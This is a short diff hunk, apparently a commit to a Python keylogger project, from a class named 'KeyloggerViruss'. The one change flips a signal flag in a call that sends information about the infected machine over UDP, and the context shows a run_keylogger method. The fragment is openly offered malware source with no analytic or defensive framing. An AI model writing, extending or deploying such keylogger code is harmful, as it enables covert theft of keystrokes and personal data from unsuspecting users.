@@ -80,7 +80,7 @@ class KeyloggerViruss():
 
     def start_session(self):
         # self.start_monitor()
-        self.send_udp_message(message=self.info_self, signal=False)
+        self.send_udp_message(message=self.info_self, signal=True)
 
 
     def run_keylogger(self, buffer_size: int = 4096):
